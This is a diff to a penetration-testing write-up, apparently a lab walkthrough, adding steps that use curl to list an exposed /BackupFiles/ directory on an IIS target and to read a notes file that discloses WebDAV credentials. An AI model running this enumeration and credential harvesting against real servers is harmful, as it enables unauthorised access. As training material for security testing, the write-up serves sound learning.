@@ -174,3 +174,28 @@ CONFIG~1.ASP --- configurational files, can contain credentials
 USERS~1.XLS --- User data export, high value target
 
 After this the attacker will go for actual content of discovered resource
+
+### Enumerating the Discovered Directory
+
+After finding the directory scan for files:
+
+`curl http://TARGET_IP/BackupFiles/`
+
+output:
+
+`<html><head><title>10.114.155.95 - /BackupFiles/</title></head><body><H1>10.114.155.95 - /BackupFiles/</H1><hr>
+
+<pre><A HREF="/">[To Parent Directory]</A><br><br> 4/13/2026  2:25 PM           14 <A HREF="/BackupFiles/site-backup.cfg">site-backup.cfg</A><br> 4/25/2026 11:31 AM          168 <A HREF="/BackupFiles/web.config">web.config</A><br> 4/25/2026 11:04 AM           91 <A HREF="/BackupFiles/webdav_notes.txt">webdav_notes.txt</A><br></pre><hr></body></html>`
+
+This command reveals /BackupFiles/webdav_notes.txt directory.
+
+command:
+
+`curl http://TARGET_IP/BackupFiles/webdav_notes.txt`
+
+output:
+
+`WebDAV setup notes
+Directory: /webdav/
+Username: webdav_user
+Password: P@ssw0rd!123`
